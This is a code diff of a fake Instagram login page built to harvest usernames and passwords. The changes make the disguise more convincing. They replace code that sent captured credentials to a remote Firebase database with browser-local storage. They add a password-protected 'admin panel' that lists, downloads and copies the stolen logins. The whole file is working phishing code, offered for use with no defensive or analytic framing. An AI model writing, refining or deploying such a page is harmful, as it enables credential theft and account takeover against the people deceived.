@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Free Followers</title>
+    <title>Instagram</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         * {
@@ -31,7 +31,6 @@
             max-width: 400px;
         }
 
-        /* Login Page */
         .login-page {
             display: block;
         }
@@ -360,9 +359,15 @@
             background: #e0e0e0;
         }
 
-        .refresh-btn {
-            width: 100%;
-            padding: 8px;
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .action-buttons button {
+            flex: 1;
+            padding: 10px;
             background: #f0f0f0;
             color: #262626;
             border: none;
@@ -370,11 +375,19 @@
             font-size: 13px;
             font-weight: 600;
             cursor: pointer;
-            margin-bottom: 15px;
         }
 
-        .refresh-btn:hover {
+        .action-buttons button:hover {
             background: #e0e0e0;
+        }
+
+        .info-box {
+            background: #e8f5e9;
+            padding: 12px;
+            border-radius: 5px;
+            font-size: 12px;
+            color: #2e7d32;
+            margin-bottom: 15px;
         }
     </style>
 </head>
@@ -384,7 +397,7 @@
         <div class="container">
             <div class="login-box">
                 <div class="login-header">
-                    <div class="instagram-logo">Instagram Free Followers</div>
+                    <div class="instagram-logo">Instagram</div>
                 </div>
 
                 <form id="loginForm">
@@ -398,7 +411,7 @@
                             <input 
                                 type="text" 
                                 id="username" 
-                                placeholder="username, or email"
+                                placeholder="Phone number, username, or email"
                             >
                         </div>
 
@@ -437,11 +450,14 @@
     <div class="admin-page" id="adminPage">
         <div class="admin-header">
             <h1>📊 Admin Panel</h1>
-            <p>View all login details (synced across all devices)</p>
+            <p>View all login details</p>
         </div>
 
         <div class="admin-container">
-            <button class="refresh-btn" onclick="refreshDetails()">🔄 Refresh Data</button>
+            <div class="info-box">
+                ℹ️ Data is stored on THIS DEVICE. Each browser keeps separate data. To see data from other browsers, login in that browser first.
+            </div>
+
             <button class="logout-btn" onclick="closeAdminPanel()">Logout</button>
 
             <div class="details-title">
@@ -450,7 +466,12 @@
             </div>
 
             <div class="details-list" id="detailsList">
-                <div class="no-details">Loading...</div>
+                <div class="no-details">No login details yet</div>
+            </div>
+
+            <div class="action-buttons">
+                <button onclick="downloadDetails()">📥 Download</button>
+                <button onclick="copyToClipboard()">📋 Copy</button>
             </div>
 
             <button class="clear-all-btn" id="clearBtn" onclick="clearAllDetails()" style="display: none;">
@@ -467,11 +488,7 @@
         const adminPage = document.getElementById('adminPage');
         const loginPage = document.getElementById('loginPage');
 
-        // Admin password
         const ADMIN_PASSWORD = '1234';
-
-        // Firebase config (free database)
-        const DATABASE_URL = 'https://instagram-login-3abc5.firebaseio.com/logins.json';
 
         function showError(message) {
             errorMsg.textContent = message;
@@ -489,8 +506,10 @@
             }, 2000);
         }
 
-        async function saveToDatabase(username, password) {
+        function saveToStorage(username, password) {
             try {
+                let details = JSON.parse(localStorage.getItem('instagramDetails') || '[]');
+                
                 const detail = {
                     username: username,
                     password: password,
@@ -500,62 +519,31 @@
                     id: Date.now()
                 };
 
-                const response = await fetch(DATABASE_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(detail)
-                });
-
-                if (response.ok) {
-                    console.log('✅ Data saved to cloud!');
-                    return true;
-                } else {
-                    console.error('❌ Failed to save');
-                    return false;
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                // Fallback: save to local storage if cloud fails
-                let localDetails = JSON.parse(localStorage.getItem('details') || '[]');
-                localDetails.push({
-                    username: username,
-                    password: password,
-                    timestamp: new Date().toLocaleString(),
-                    date: new Date().toLocaleDateString(),
-                    time: new Date().toLocaleTimeString(),
-                    id: Date.now()
-                });
-                localStorage.setItem('details', JSON.stringify(localDetails));
+                details.push(detail);
+                localStorage.setItem('instagramDetails', JSON.stringify(details));
+                console.log('✅ Data saved to local storage!');
                 return true;
-            }
-        }
-
-        async function loadFromDatabase() {
-            try {
-                const response = await fetch(DATABASE_URL);
-                if (response.ok) {
-                    const data = await response.json();
-                    if (data) {
-                        return Object.values(data);
-                    }
-                }
             } catch (error) {
-                console.error('Error loading:', error);
+                console.error('Error saving:', error);
+                return false;
             }
-            
-            // Fallback to local storage
-            return JSON.parse(localStorage.getItem('details') || '[]');
         }
 
-        async function openAdminPanel() {
+        function loadFromStorage() {
+            try {
+                return JSON.parse(localStorage.getItem('instagramDetails') || '[]');
+            } catch (error) {
+                return [];
+            }
+        }
+
+        function openAdminPanel() {
             const password = prompt('Enter admin password:');
             if (password === ADMIN_PASSWORD) {
                 loginPage.classList.add('hidden');
                 adminPage.classList.add('show');
                 document.body.classList.add('admin-open');
-                await refreshDetails();
+                displayDetails();
             } else if (password !== null) {
                 showError('Wrong password!');
             }
@@ -567,18 +555,15 @@
             document.body.classList.remove('admin-open');
         }
 
-        async function refreshDetails() {
+        function displayDetails() {
             const detailsList = document.getElementById('detailsList');
             const detailsCount = document.getElementById('detailsCount');
             const clearBtn = document.getElementById('clearBtn');
 
-            detailsList.innerHTML = '<div class="no-details">Loading...</div>';
-
-            const details = await loadFromDatabase();
-
+            const details = loadFromStorage();
             detailsCount.textContent = details.length;
 
-            if (!details || details.length === 0) {
+            if (details.length === 0) {
                 detailsList.innerHTML = '<div class="no-details">No login details yet</div>';
                 clearBtn.style.display = 'none';
                 return;
@@ -598,24 +583,32 @@
                 `).join('');
         }
 
-        async function clearAllDetails() {
+        function clearAllDetails() {
             if (confirm('Delete all login details?')) {
-                try {
-                    const response = await fetch(DATABASE_URL, {
-                        method: 'DELETE'
-                    });
-
-                    if (response.ok) {
-                        localStorage.removeItem('details');
-                        await refreshDetails();
-                        showSuccess('All data deleted!');
-                    }
-                } catch (error) {
-                    console.error('Error:', error);
-                    localStorage.removeItem('details');
-                    await refreshDetails();
-                }
+                localStorage.removeItem('instagramDetails');
+                displayDetails();
+                showSuccess('All data deleted!');
             }
+        }
+
+        function downloadDetails() {
+            const details = loadFromStorage();
+            const json = JSON.stringify(details, null, 2);
+            const blob = new Blob([json], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'login-details.json';
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        function copyToClipboard() {
+            const details = loadFromStorage();
+            const text = details.map(d => `${d.username} | ${d.password} | ${d.timestamp}`).join('\n');
+            navigator.clipboard.writeText(text).then(() => {
+                showSuccess('Copied to clipboard!');
+            });
         }
 
         loginForm.addEventListener('submit', async function(e) {
@@ -632,7 +625,9 @@
             loginBtn.disabled = true;
             loginBtn.innerHTML = '<span class="spinner"></span>Logging in...';
 
-            const success = await saveToDatabase(username, password);
+            await new Promise(resolve => setTimeout(resolve, 800));
+
+            const success = saveToStorage(username, password);
 
             loginBtn.disabled = false;
             loginBtn.innerHTML = 'Log in';
@@ -648,7 +643,7 @@
         });
 
         window.addEventListener('load', () => {
-            console.log('📱 Instagram Login Page Loaded');
+            console.log('📱 Instagram Login Page');
             console.log('Admin password: 1234');
         });
     </script>
